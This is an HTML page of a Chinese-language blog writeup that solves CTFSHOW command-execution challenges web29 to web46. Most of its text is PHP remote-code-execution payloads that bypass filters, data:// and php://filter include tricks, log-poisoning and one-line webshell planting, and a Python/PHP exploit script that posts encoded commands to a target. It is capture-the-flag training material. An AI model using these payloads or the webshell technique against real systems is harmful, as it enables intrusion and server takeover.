<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CTFSHOW-命令执行-Writeup | Xrntkk&#39;s Blog</title>
<meta name="keywords" content="writeup, ctf, Web">
<meta name="description" content="web29
 1&lt;?php
 2
 3/*
 4# -*- coding: utf-8 -*-
 5# @Author: h1xa
 6# @Date:   2020-09-04 00:12:34
 7# @Last Modified by:   h1xa
 8# @Last Modified time: 2020-09-04 00:26:48
 9# @email: h1xa@ctfer.com
10# @link: https://ctfer.com
11
12*/
13
14error_reporting(0);
15if(isset($_GET[&#39;c&#39;])){
16    $c = $_GET[&#39;c&#39;];
17    if(!preg_match(&#34;/flag/i&#34;, $c)){
18        eval($c);
19    }
20    
21}else{
22    highlight_file(__FILE__);
23}
可以看到通过eval函数可以执行php代码或者系统命令，其中过滤了flag。">
<meta name="author" content="Xrntkk">
<link rel="canonical" href="http://localhost:1313/post/ctfshow/ctfshow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <meta name="referrer" content="no-referrer-when-downgrade">
<link crossorigin="anonymous" href="/assets/css/stylesheet.db3874ad7714b044ca574a35a48fc9a38e491dfc56e271a0c1a44fda4c8c0b3d.css" integrity="sha256-2zh0rXcUsETKV0o1pI/Jo45JHfxW4nGgwaRP2kyMCz0=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/ctfshow/ctfshow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="http://localhost:1313/post/ctfshow/ctfshow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
  <meta property="og:title" content="CTFSHOW-命令执行-Writeup">
  <meta property="og:description" content="web29 1&lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:26:48 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET[&#39;c&#39;])){ 16 $c = $_GET[&#39;c&#39;]; 17 if(!preg_match(&#34;/flag/i&#34;, $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 可以看到通过eval函数可以执行php代码或者系统命令，其中过滤了flag。">
  <meta property="og:locale" content="zh">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2024-12-22T00:27:55+08:00">
    <meta property="article:modified_time" content="2024-12-22T00:27:55+08:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Web">
      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:title" content="CTFSHOW-命令执行-Writeup">
<meta name="twitter:description" content="web29
 1&lt;?php
 2
 3/*
 4# -*- coding: utf-8 -*-
 5# @Author: h1xa
 6# @Date:   2020-09-04 00:12:34
 7# @Last Modified by:   h1xa
 8# @Last Modified time: 2020-09-04 00:26:48
 9# @email: h1xa@ctfer.com
10# @link: https://ctfer.com
11
12*/
13
14error_reporting(0);
15if(isset($_GET[&#39;c&#39;])){
16    $c = $_GET[&#39;c&#39;];
17    if(!preg_match(&#34;/flag/i&#34;, $c)){
18        eval($c);
19    }
20    
21}else{
22    highlight_file(__FILE__);
23}
可以看到通过eval函数可以执行php代码或者系统命令，其中过滤了flag。">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CTFSHOW-命令执行-Writeup",
      "item": "http://localhost:1313/post/ctfshow/ctfshow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CTFSHOW-命令执行-Writeup",
  "name": "CTFSHOW-命令执行-Writeup",
  "description": "web29 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:26:48 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 可以看到通过eval函数可以执行php代码或者系统命令，其中过滤了flag。\n",
  "keywords": [
    "writeup", "ctf", "Web"
  ],
  "articleBody": "web29 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:26:48 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag/i\", $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 可以看到通过eval函数可以执行php代码或者系统命令，其中过滤了flag。\n进行绕过就行，解法很多\nc=system(“cat fl*g.php | grep -E ‘fl.g’ “);\nc=system(“tac fl*g.php”);\nc=system(“cat fl*g.php”);（用cat要右键查看源代码才能看到回显）\nc=system(“cp fl*g.php a.txt “);（访问a.txt查看）\nc=system(’echo -e \" \u003c?php \\n error_reporting(0); \\n $c= $_GET['c']; \\n eval($c); \" \u003e a.php’); //直接新建一个页面并写入一句话木马 （/a.php?c=system(“tac flag.php”);）\n?c=echo `tac fla*`;\n….\nweb30 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:42:26 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag|system|php/i\", $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 这里过滤了关键字flag，system还有php，由于过滤了system我们需要使用其他的系统函数进行命令执行\npayload:\nc=printf(exec(“cat%20fl*”));\nc=echo exec(“cat f\\lag.p\\hp”);\nc=show_source(scandir(”.”)[2]); (这个函数会返回一个包含当前目录下所有文件和目录项的数组)\nc=highlight_file(next(array_reverse(scandir(”.”))));\nc=passthru(“tac fla*”);\nc=echo `tac fla*`;\nc=$a=sys;$b=tem;$c=$a.$b;$c(“tac fla*”);*\nc=echo shell_exec(“tac fla*”);\nc=eval($_GET[1]);\u00261=system(“tac flag.php”);\nc=passthru(base64_decode(“Y2F0IGZsYWcucGhw==”));(base64绕过)\n……\nweb31 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:49:10 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'/i\", $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 这题屏蔽了关键词 /flag|system|php|cat|sort|shell|.| |'\npayload:\nc=eval($_GET[1]);\u00261=system(“tac flag.php”); c=show_source(scandir(getcwd())[2]); c=show_source(next(array_reverse(scandir(pos(localeconv()))))); c=passthru(“tac%09fla*”); c=echo`tac%09fla*`; web32 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:56:31 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\", $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 这题屏蔽了关键词 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(\n过滤了空格可以用${IFS}和%0a 代替，分号可以用?\u003e代替\n用include构造payload：\nurl/?c=include$_GET[1]?\u003e\u00261=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[1]?\u003e\u00261=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\n得到的结果用base64解码一下就可以得到flag了\n或者用日志注入：\nurl/?c=include$_GET[1]?%3E\u00261=../../../../var/log/nginx/access.log /var/log/nginx/access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可\nweb33 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 02:22:27 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12// 13error_reporting(0); 14if(isset($_GET['c'])){ 15 $c = $_GET['c']; 16 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\\"/i\", $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽的关键词比上一题多了个双引号 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|\"\n继续使用include构造payload：\nurl/?c=include$_GET[1]?\u003e\u00261=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[1]?\u003e\u00261=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb34 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 04:21:29 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET['c'])){ 15 $c = $_GET['c']; 16 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"/i\", $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽的关键词 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\"\n继续使用include构造payload：\nurl/?c=include$_GET[1]?\u003e\u00261=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[1]?\u003e\u00261=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb35 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 04:21:23 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET['c'])){ 15 $c = $_GET['c']; 16 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\\u003c|\\=/i\", $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽关键词 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\"|\u003c|=\n继续使用include构造payload：（wsm还能秒）\nurl/?c=include$_GET[1]?\u003e\u00261=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[1]?\u003e\u00261=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb36 1\u003c?php 2 3/* 4\\# -*- coding: utf-8 -*- 5\\# @Author: h1xa 6\\# @Date: 2020-09-04 00:12:34 7\\# @Last Modified by: h1xa 8\\# @Last Modified time: 2020-09-04 04:21:16 9\\# @email: h1xa@ctfer.com 10\\# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET['c'])){ 15 $c = $_GET['c']; 16 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\\u003c|\\=|\\/|[0-9]/i\", $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽关键字 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\"|\u003c|=|/|[0-9]\n不是哥们，数字也要屏蔽，那我改一下不就好了\n继续使用include构造payload：\nurl/?c=include$_GET[m]?\u003e\u0026m=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[m]?\u003e\u0026m=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb37 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 05:18:55 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag/i\", $c)){ 18 include($c); 19 echo $flag; 20 21 } 22 23}else{ 24 highlight_file(__FILE__); 25} 不是哥们，怎么还是文件包含\npayload：\n?c=data://text/plain,\u003c?php system(\"tac fla*.php\")?\u003e\n或者\n?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=\nweb38 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 05:23:36 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag|php|file/i\", $c)){ 18 include($c); 19 echo $flag; 20 21 } 22 23}else{ 24 highlight_file(__FILE__); 25} payload:\n?c=data://text/plain,\u003c?=system(\"tac%20fla*\")?\u003e\n或者\n?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=\nweb39 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 06:13:21 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag/i\", $c)){ 18 include($c.\".php\"); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 这里会在我们传入的c后面拼接一段.php\n我们只需要在加入\u003c?php ?\u003e那么php就只会执行中间的代码，后面的内容不会执行\n故payload：\n?c=data://text/plain,\u003c?php system(\"tac fla*.php\")?\u003e\nweb40 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 06:03:36 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13 14if(isset($_GET['c'])){ 15 $c = $_GET['c']; 16 if(!preg_match(\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\\u0026|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\\u003c|\\.|\\\u003e|\\/|\\?|\\\\\\\\/i\", $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽关键词 /[0-9]|~|`|@|#|\\$|%|^|\u0026|*|\\（|\\）|-|=|+|{|[|]|}|:|'|\"|,|\u003c|.|\u003e|/|?|\\\\\n这里要使用无参命令执行\npayload：\n?c=show_source(next(array_reverse(scandir(pos(localeconv())))));\n关于无参命令执行的一些解释\nweb41 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: 羽 6# @Date: 2020-09-05 20:31:22 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:40:07 9# @email: 1341963450@qq.com 10# @link: https://ctf.show 11 12*/ 13 14if(isset($_POST['c'])){ 15 $c = $_POST['c']; 16if(!preg_match('/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026|\\-/i', $c)){ 17 eval(\"echo($c);\"); 18 } 19}else{ 20 highlight_file(__FILE__); 21} 22?\u003e 过滤内容：/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026|\\-/i\n这个题过滤了$、+、-、^、~使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符|。 我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。\n大佬的脚本\n1\u003c?php 2$myfile = fopen(\"rce_or.txt\", \"w\"); 3$contents=\"\"; 4for ($i=0; $i \u003c 256; $i++) { 5\tfor ($j=0; $j \u003c256 ; $j++) { 6 7\tif($i\u003c16){ 8\t$hex_i='0'.dechex($i); 9\t} 10\telse{ 11\t$hex_i=dechex($i); 12\t} 13\tif($j\u003c16){ 14\t$hex_j='0'.dechex($j); 15\t} 16\telse{ 17\t$hex_j=dechex($j); 18\t} 19\t$preg = '/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026|\\-/i'; 20\tif(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){ 21\techo \"\"; 22 } 23 24\telse{ 25\t$a='%'.$hex_i; 26\t$b='%'.$hex_j; 27\t$c=(urldecode($a)|urldecode($b)); 28\tif (ord($c)\u003e=32\u0026ord($c)\u003c=126) { 29\t$contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\"; 30\t} 31\t} 32 33} 34} 35fwrite($myfile,$contents); 36fclose($myfile); 1# -*- coding: utf-8 -*- 2import requests 3import urllib 4from sys import * 5import os 6os.system(\"php rce_or.php\") #没有将php写入环境变量需手动运行 7if(len(argv)!=2): 8 print(\"=\"*50) 9 print('USER：python exp.py ') 10 print(\"eg： python exp.py http://ctf.show/\") 11 print(\"=\"*50) 12 exit(0) 13url=argv[1] 14def action(arg): 15 s1=\"\" 16 s2=\"\" 17 for i in arg: 18 f=open(\"rce_or.txt\",\"r\") 19 while True: 20 t=f.readline() 21 if t==\"\": 22 break 23 if t[0]==i: 24 #print(i) 25 s1+=t[2:5] 26 s2+=t[6:9] 27 break 28 f.close() 29 output=\"(\\\"\"+s1+\"\\\"|\\\"\"+s2+\"\\\")\" 30 return(output) 31 32while True: 33 param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\")) 34 data={ 35 'c':urllib.parse.unquote(param) 36 } 37 r=requests.post(url,data=data) 38 print(\"\\n[*] result:\\n\"+r.text) 将两个文件放在同一个文件夹，运行exp.py即可\n羽师傅nb\n注意链接要用http不能用https\nweb42 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 20:51:55 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET['c'])){ 16 $c=$_GET['c']; 17 system($c.\" \u003e/dev/null 2\u003e\u00261\"); 18}else{ 19 highlight_file(__FILE__); 20} 这道题会将我们输入的命令与\" \u003e/dev/null 2\u003e\u00261\"进行拼接\n/dev/null 2\u003e\u00261 意思是将标准输出和标准错误都重定向到 /dev/null 即不回显\n导致我们无法成功执行\n我们可以通过%0a截断的方式绕过\ntac fl*%0a\nor\n; //分号 | //只执行后面那条命令 || //只执行前面那条命令 \u0026 //两条命令都会执行 \u0026\u0026 //两条命令都会执行\n过滤了分号和cat，可以用||和\u0026来代替分号，tac代替cat\n可构造playload: url/?c=tac flag.php|| url/?c=tac flag.php%26 注意，这里的\u0026需要url编码\nweb43 过滤了cat、；，\n不是很影响\ntac fl*%0a\ror\rtac flag.php||\r...\r//记得转url编码 web44 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 21:32:01 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET['c'])){ 16 $c=$_GET['c']; 17 if(!preg_match(\"/;|cat|flag/i\", $c)){ 18 system($c.\" \u003e/dev/null 2\u003e\u00261\"); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了;|cat|flag\n小问题\ntac fl*%0a\ror\rtac f*||\r...\r//记得转url编码 web45 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 21:35:34 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET['c'])){ 16 $c=$_GET['c']; 17 if(!preg_match(\"/\\;|cat|flag| /i\", $c)){ 18 system($c.\" \u003e/dev/null 2\u003e\u00261\"); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了;|cat|flag和空格\n可以用%09或$IFS$9代替空格\ntac%09fl*%0a\ror\rtac%09f*||\ror\recho$IFS`tac$IFS*`%0A\r...\r//记得转url编码 web46 \u003c?php\r/*\r# -*- coding: utf-8 -*-\r# @Author: h1xa\r# @Date: 2020-09-05 20:49:30\r# @Last Modified by: h1xa\r# @Last Modified time: 2020-09-05 21:50:19\r# @email: h1xa@ctfer.com\r# @link: https://ctfer.com\r*/\rif(isset($_GET['c'])){\r$c=$_GET['c'];\rif(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*/i\", $c)){\rsystem($c.\" \u003e/dev/null 2\u003e\u00261\");\r}\r}else{\rhighlight_file(__FILE__);\r} 过滤有点多啊\n;|cat|flag| |[0-9]|\\$|*\n但是事实上我们上题使用的方法并不会受到影响，因为%09是url编码，不会被当成数字过滤\ntac%09fl*%0a\ror\rtac%09f*||\ror\rtac",
  "wordCount" : "12686",
  "inLanguage": "zh",
  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2024-12-22T00:27:55+08:00",
  "dateModified": "2024-12-22T00:27:55+08:00",
  "author":{
    "@type": "Person",
    "name": "Xrntkk"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/post/ctfshow/ctfshow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Xrntkk's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
                    <span>首页</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/categories/" title="Categories">
                    <span>分类</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>标签</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="搜索">
                    <span>搜索</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about/" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      CTFSHOW-命令执行-Writeup
    </h1>
<div class="post-meta"><span title='2024-12-22 00:27:55 +0800 CST'>2024-12-22</span>&nbsp;·&nbsp;26 分钟&nbsp;·&nbsp;Xrntkk

<div class="meta-item">&nbsp·&nbsp
  <span id="busuanzi_container_page_pv">Readings: <span id="busuanzi_value_page_pv"></span></span>
  </div>      
</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">目录</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#web29" aria-label="web29">web29</a></li>
                <li>
                    <a href="#web30" aria-label="web30">web30</a></li>
                <li>
                    <a href="#web31" aria-label="web31">web31</a></li>
                <li>
                    <a href="#web32" aria-label="web32">web32</a></li>
                <li>
                    <a href="#web33" aria-label="web33">web33</a></li>
                <li>
                    <a href="#web34" aria-label="web34">web34</a></li>
                <li>
                    <a href="#web35" aria-label="web35">web35</a></li>
                <li>
                    <a href="#web36" aria-label="web36">web36</a></li>
                <li>
                    <a href="#web37" aria-label="web37">web37</a></li>
                <li>
                    <a href="#web38" aria-label="web38">web38</a></li>
                <li>
                    <a href="#web39" aria-label="web39">web39</a></li>
                <li>
                    <a href="#web40" aria-label="web40">web40</a></li>
                <li>
                    <a href="#web41" aria-label="web41">web41</a></li>
                <li>
                    <a href="#web42" aria-label="web42">web42</a></li>
                <li>
                    <a href="#web43" aria-label="web43">web43</a></li>
                <li>
                    <a href="#web44" aria-label="web44">web44</a></li>
                <li>
                    <a href="#web45" aria-label="web45">web45</a></li>
                <li>
                    <a href="#web46" aria-label="web46">web46</a></li>
                <li>
                    <a href="#web47" aria-label="web47">web47</a></li>
                <li>
                    <a href="#web48" aria-label="web48">web48</a></li>
                <li>
                    <a href="#web49" aria-label="web49">web49</a></li>
                <li>
                    <a href="#web50" aria-label="web50">web50</a></li>
                <li>
                    <a href="#web51" aria-label="web51">web51</a></li>
                <li>
                    <a href="#web51-1" aria-label="web51">web51</a></li>
                <li>
                    <a href="#web52" aria-label="web52">web52</a></li>
                <li>
                    <a href="#web54" aria-label="web54">web54</a></li>
                <li>
                    <a href="#web55" aria-label="web55">web55</a></li>
                <li>
                    <a href="#web56" aria-label="web56">web56</a></li>
                <li>
                    <a href="#web57" aria-label="web57">web57</a></li>
                <li>
                    <a href="#web58" aria-label="web58">web58</a></li>
                <li>
                    <a href="#web59" aria-label="web59">web59</a></li>
                <li>
                    <a href="#web60" aria-label="web60">web60</a></li>
                <li>
                    <a href="#web61" aria-label="web61">web61</a></li>
                <li>
                    <a href="#web62" aria-label="web62">web62</a></li>
                <li>
                    <a href="#web62-1" aria-label="web62">web62</a></li>
                <li>
                    <a href="#web63" aria-label="web63">web63</a></li>
                <li>
                    <a href="#web64" aria-label="web64">web64</a></li>
                <li>
                    <a href="#web65" aria-label="web65">web65</a></li>
                <li>
                    <a href="#web66" aria-label="web66">web66</a></li>
                <li>
